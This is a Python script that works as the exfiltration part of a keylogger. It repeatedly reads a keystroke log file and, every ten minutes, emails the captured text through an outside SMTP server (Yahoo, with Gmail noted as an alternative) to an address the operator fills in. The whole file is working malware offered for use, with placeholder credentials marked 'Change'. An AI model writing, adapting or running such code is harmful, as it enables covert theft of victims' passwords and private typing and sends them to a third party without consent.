#!/usr/bin/python

import smtplib
import sys
from time import sleep
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

email = 'youremail' # Change
passw = 'yourpassword' # Change
logfile = 'logfile.txt'
count = 1
previous = ''

def Send():
    global count
    global previous
    keylog = ReadLogFile()
    while keylog == previous or len(keylog) == 0:
        keylog = ReadLogFile()
    sleep(600)
    keylog = ReadLogFile()
    previous = keylog
    smtp = smtplib.SMTP('smtp.mail.yahoo.com', 587) # Change Gmail is: smtp.gmail.com
    smtp.ehlo()
    smtp.starttls()
    smtp.login(email, passw)
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = 'Key #{}'.format(count)
    msg.attach(MIMEText(keylog))
    smtp.sendmail(email, email, msg.as_string())
    smtp.close()
    count += 1
    if 'Done!!' in keylog:
        sys.exit(0)

def ReadLogFile():
    try:
        with open(logfile, 'r') as fp:
            return fp.read()
    except:
        return 'Log File Has Not Been Created Yet'

def main():
    while True:
        Send()

if __name__ == '__main__':
    main()
    
